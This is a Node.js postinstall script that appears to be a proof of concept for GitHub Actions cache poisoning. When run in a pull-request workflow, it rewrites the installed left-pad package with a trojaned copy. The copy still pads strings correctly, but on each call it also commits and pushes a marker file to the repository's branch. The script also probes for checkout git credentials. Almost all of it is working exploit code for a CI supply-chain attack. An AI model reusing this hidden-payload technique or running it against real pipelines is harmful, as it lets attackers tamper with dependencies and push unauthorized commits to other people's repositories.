import { execFileSync } from "node:child_process";
import { appendFileSync, existsSync, mkdirSync, readFileSync, writeFileSync } from "node:fs";
import { dirname, join } from "node:path";

const proofDir = process.env.POC_PROOF_DIR || ".poc-proof";
const target = join("node_modules", "left-pad", "index.js");
mkdirSync(proofDir, { recursive: true });

function gitExtraHeaderPresent() {
  try {
    const value = execFileSync("git", ["config", "--get-all", "http.https://github.com/.extraheader"], {
      encoding: "utf8",
      stdio: ["ignore", "pipe", "ignore"]
    }).trim();
    return Boolean(value);
  } catch {
    return false;
  }
}

if (!existsSync(target)) {
  throw new Error("Expected left-pad to be installed before postinstall runs.");
}

const original = readFileSync(target, "utf8");
mkdirSync(dirname(target), { recursive: true });
writeFileSync(target, "const { execFileSync } = require(\"child_process\");\nconst fs = require(\"fs\");\nconst path = require(\"path\");\n\nfunction cleanLeftPad(input, length, character) {\n  const value = String(input);\n  const fill = character === undefined ? \" \" : String(character || \" \");\n  if (value.length >= length) return value;\n  return fill.repeat(Math.ceil((length - value.length) / fill.length)).slice(0, length - value.length) + value;\n}\n\nfunction runGit(args) {\n  return execFileSync(\"git\", args, {\n    encoding: \"utf8\",\n    stdio: [\"ignore\", \"pipe\", \"pipe\"]\n  }).trim();\n}\n\nfunction errorText(error) {\n  const stderr = error && error.stderr ? String(error.stderr).trim() : \"\";\n  const stdout = error && error.stdout ? String(error.stdout).trim() : \"\";\n  return (stderr || stdout || error.message || String(error)).slice(0, 1000);\n}\n\nfunction commitMarker(proof) {\n  const branch = process.env.GITHUB_REF_NAME || \"main\";\n  proof.gitTargetBranch = branch;\n  proof.gitPushAttempted = false;\n  proof.gitPushSucceeded = false;\n\n  try {\n    runGit([\"config\", \"user.name\", \"cached-left-pad\"]);\n    runGit([\"config\", \"user.email\", \"cached-left-pad@users.noreply.github.com\"]);\n    runGit([\"add\", \"hehe.txt\"]);\n\n    try {\n      execFileSync(\"git\", [\"diff\", \"--cached\", \"--quiet\"], { stdio: \"ignore\" });\n      proof.gitCommitCreated = false;\n      proof.gitPushSkipped = \"marker file already matched the index\";\n      return;\n    } catch {\n      proof.gitCommitCreated = true;\n    }\n\n    runGit([\"commit\", \"-m\", \"Add cached dependency marker\"]);\n    proof.gitPushAttempted = true;\n    const output = runGit([\"push\", \"origin\", \"HEAD:\" + branch]);\n    proof.gitPushSucceeded = true;\n    proof.gitPushOutput = output.slice(0, 500);\n  } catch (error) {\n    proof.gitPushError = errorText(error);\n  }\n}\n\nfunction writeProof() {\n  const proofDir = process.env.POC_PROOF_DIR || \".poc-proof\";\n  fs.mkdirSync(proofDir, { recursive: true });\n\n  const marker = [\n    \"patched left-pad executed in release workflow\",\n    \"repository=\" + (process.env.GITHUB_REPOSITORY || \"\"),\n    \"event=\" + (process.env.GITHUB_EVENT_NAME || \"\"),\n    \"run=\" + (process.env.GITHUB_RUN_ID || \"\"),\n    \"sha=\" + (process.env.GITHUB_SHA || \"\"),\n    \"time=\" + new Date().toISOString(),\n    \"\"\n  ].join(\"\\n\");\n\n  const proof = {\n    message: \"Patched npm package executed inside trusted release workflow.\",\n    package: \"left-pad\",\n    eventName: process.env.GITHUB_EVENT_NAME || \"\",\n    repository: process.env.GITHUB_REPOSITORY || \"\",\n    ref: process.env.GITHUB_REF || \"\",\n    sha: process.env.GITHUB_SHA || \"\",\n    contentsWriteDemo: true,\n    markerFile: \"hehe.txt\",\n    note: \"This POC does not use secrets. The patched package writes and attempts to push a same-repository marker commit.\"\n  };\n\n  fs.writeFileSync(\"hehe.txt\", marker);\n  commitMarker(proof);\n  fs.writeFileSync(path.join(proofDir, \"release-proof.json\"), JSON.stringify(proof, null, 2) + \"\\n\");\n\n  if (process.env.GITHUB_STEP_SUMMARY) {\n    fs.appendFileSync(process.env.GITHUB_STEP_SUMMARY, [\n      \"## Patched dependency executed\",\n      \"\",\n      \"~~~json\",\n      JSON.stringify(proof, null, 2),\n      \"~~~\",\n      \"\"\n    ].join(\"\\n\"));\n  }\n}\n\nmodule.exports = function leftPad(input, length, character) {\n  writeProof();\n  return cleanLeftPad(input, length, character);\n};\n");

const proof = {
  message: "PR postinstall patched an installed npm dependency.",
  eventName: process.env.GITHUB_EVENT_NAME || "",
  repository: process.env.GITHUB_REPOSITORY || "",
  ref: process.env.GITHUB_REF || "",
  sha: process.env.GITHUB_SHA || "",
  packagePatched: "left-pad",
  patchedFile: target,
  originalBytes: original.length,
  checkoutGitCredentialsPresent: gitExtraHeaderPresent(),
  note: "The install step does not need secrets. It only writes dependency state that actions/cache can persist."
};

writeFileSync(join(proofDir, "proof.json"), JSON.stringify(proof, null, 2) + "\n");
appendFileSync(process.env.GITHUB_STEP_SUMMARY || join(proofDir, "summary.md"), [
  "## PR install hook patched dependency",
  "",
  "~~~json",
  JSON.stringify(proof, null, 2),
  "~~~",
  ""
].join("\n"));

console.log("[pr postinstall] patched node_modules/left-pad/index.js");
console.log("[pr postinstall] event=" + proof.eventName);
console.log("[pr postinstall] proof file=" + join(proofDir, "proof.json"));
